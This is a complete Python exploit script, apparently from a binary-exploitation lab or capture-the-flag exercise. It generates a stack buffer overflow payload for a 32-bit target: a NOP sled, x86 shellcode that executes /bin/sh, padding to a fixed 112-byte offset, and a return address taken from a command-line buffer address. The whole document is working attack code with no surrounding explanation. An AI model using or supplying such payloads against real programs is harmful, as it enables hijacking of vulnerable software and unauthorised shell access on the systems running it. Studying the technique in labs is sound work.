#!/usr/bin/env python3
import sys
import struct

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <buf_addr_hex>")
    sys.exit(1)

buf_addr = int(sys.argv[1], 16)

OFFSET = 112  # 0x6c + 4

shellcode = (
    b"\x31\xc0"
    b"\x50"
    b"\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e"
    b"\x89\xe3"
    b"\x50"
    b"\x53"
    b"\x89\xe1"
    b"\x99"
    b"\xb0\x0b"
    b"\xcd\x80"
)

nop = b"\x90" * 64
ret = struct.pack("<I", buf_addr + 0x20)

payload = (nop + shellcode).ljust(OFFSET, b"A") + ret

sys.stdout.buffer.write(payload)
